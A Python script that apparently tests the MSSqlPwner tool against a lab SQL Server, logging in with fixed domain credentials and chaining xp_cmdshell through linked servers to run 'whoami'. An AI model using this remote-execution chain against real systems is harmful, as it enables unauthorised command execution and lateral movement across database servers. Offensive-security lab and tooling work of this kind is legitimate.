import time

import MSSqlPwner
import logging


class Struct:
    def __init__(self, **entries):
        self.__dict__.update(entries)


if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler()  # This directs logs to stdout
        ]
    )

    for link_server in [None, "DC01", "APPSRV01"]:
        for options_dict in [{"port": 1433}, {"port": 1434}]:
            options = Struct(**options_dict, debug=False, max_recursive_links=4, k=False, db=None, hashes=None,
                             windows_auth=True, aesKey=None, dc_ip=None, link_server=link_server)

            for cred in [("administrator", "lab", "corp1.com"), ("offsec", "lab", "corp1.com")]:

                username, password, domain = cred
                print("-" * 30)
                print(f"Executing xp_cmdshell on {link_server} as {username}@{domain} in port {options.port}")
                mssql_client = MSSqlPwner.MSSQLPwner("192.168.1.71", options)
                logging.getLogger("impacket").setLevel(logging.ERROR)
                if mssql_client.connect(username, password, domain):
                    mssql_client.enumerate()
                    link_server = options.link_server.upper() if options.link_server else mssql_client.hostname
                    logging.getLogger("impacket").setLevel(logging.INFO)

                    mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                                         ["xp_cmdshell", "cmd.exe /c whoami"],
                                                         linked_server=link_server)
                    time.sleep(2)

                mssql_client.disconnect()
                print("-" * 30)
